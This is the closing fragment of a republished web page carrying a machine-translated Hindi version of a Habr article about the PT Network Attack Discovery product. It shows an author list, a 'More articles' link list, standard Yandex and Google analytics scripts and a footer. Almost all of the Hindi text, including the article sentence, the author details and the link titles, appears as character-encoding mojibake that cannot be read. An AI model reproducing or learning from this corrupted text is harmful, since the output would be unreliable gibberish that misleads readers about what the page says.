href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдкреАрдЯреА рдиреЗрдЯрд╡рд░реНрдХ рдЕрдЯреИрдХ рдбрд┐рд╕реНрдХрд╡рд░реА</a> рдХреЛ рд╕рд┐рдЦрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА, рдЬреЛ рдЕрдВрддрддрдГ рд╕рд╛рдЗрдмрд░ рдШрдЯрдирд╛рдУрдВ рдХреА рдкреВрд░реА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред <br><br>  <b>рд▓реЗрдЦрдХ</b> : <br><br><ul><li>  рдПрдВрдЯреЛрди рдЯрд╛рдпрд░рд┐рди, рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдкреНрд░рдореБрдЦ, рдкреАрдЯреА рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗрдВрджреНрд░, рд╕рдХрд╛рд░рд╛рддреНрдордХ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА </li><li>  Egor Podmokov, рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ, рдкреАрдЯреА рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗрдВрджреНрд░, рд╕рдХрд╛рд░рд╛рддреНрдордХ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/hi460517/">https://habr.com/ru/post/hi460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../hi460507/index.html">XEN рдФрд░ рдСрдЯреЛрдореЛрдЯрд┐рд╡ рдХрд╛ рднрд╡рд┐рд╖реНрдп: рдХреИрд╕реЗ рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ рд╣рд╛рдЗрдкрд░рд╡рд╛рдЗрдЬрд░ рд╡рд╛рдгрд┐рдЬреНрдпрд┐рдХ рдСрдЯреЛрдореЛрдЯрд┐рд╡ рд╕рдорд╛рдзрд╛рди рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рддрд┐рдпреЛрдЧреА рдмрди рдЬрд╛рддрд╛ рд╣реИ</a></li>
<li><a href="../hi460509/index.html">рдирд┐рд╡рд╛рд╕реА рдХреИрд╕реЗ рд╡реНрдпрд╛рдкрд╛рд░ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВ: рдбреЗрдЯрд╛ рдорд╛рдЗрдирд┐рдВрдЧ рдореЗрдВ рдЗрдиреНрдлреИрдЯреЗрдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдорд╛рдорд▓рд╛</a></li>
<li><a href="../hi460511/index.html">PHP-FPM рдЯреНрдпреВрдирд┐рдВрдЧ: рдЕрдзрд┐рдХрддрдо рдкреНрд░рджрд░реНрд╢рди рдХреЗ рд▓рд┐рдП pm рд╕реНрдЯреЗрдЯрд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛</a></li>
<li><a href="../hi460513/index.html">рд╕реНрдкрдВрджрди 1.7 - 10 рдЬреБрд▓рд╛рдИ 2019 рдХреЛ рд░рд┐рд▓реАрдЬрд╝ рдореЗрдВ рдирдпрд╛ рдХреНрдпрд╛ рд╣реИ</a></li>
<li><a href="../hi460515/index.html">рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдо рдбрд╛рдХреВ рдХреЗ рдЖрдЧрдорди рдХреЗ рдХрд┐рддрдиреЗ рдХрд░реАрдм рд╣реИрдВ?</a></li>
<li><a href="../hi460521/index.html">рдж рдПрдбрд╡реЗрдВрдЪрд░реНрд╕ рдСрдлрд╝ рдж рдПрд▓реВрд╕рд┐рд╡ рдорд╛рд▓реНрд╡рд╛рд░реА, рдкрд╛рд░реНрдЯ IV: рдбреАрдбреАрдИ рдФрд░ рд╡рд░реНрдб рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдлреАрд▓реНрдбреНрд╕</a></li>
<li><a href="../hi460523/index.html">рдПрдХ рдорд╛рдЗрдЯрдк рдХреА рдШреЛрд╖рдгрд╛ рдЬреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ BeerPHP рдкреЗрдп (рдореЙрд╕реНрдХреЛ рдФрд░ рдСрдирд▓рд╛рдЗрди рдореЗрдВ) рдореЗрдВ рдмрджрд▓ рдЬрд╛рддреА рд╣реИ</a></li>
<li><a href="../hi460525/index.html">рдЬреБрд▓рд╛рдИ рдореЗрдВ DINS IT EVENING рдореЗрдВ рдЖрдкрдХрд╛ рд╕реНрд╡рд╛рдЧрдд рд╣реИ: QA рдФрд░ JS</a></li>
<li><a href="../hi460527/index.html">Pwnable.kr 06 рдХреЗ рд╕рд╛рде рд╕рдорд╕реНрдпрд╛ рд╣рд▓ рдХрд░рдирд╛ - рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдФрд░ 09 - рдЧрд▓рддреА</a></li>
<li><a href="../hi460531/index.html">рдЖрдИрдЯреА рд╡рд░реНрд▓реНрдб рд╕реЗ рдЙрддреНрд╕реБрдХ рд╡рд┐рдХреГрддрд┐рдпрд╛рдВ - 5</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>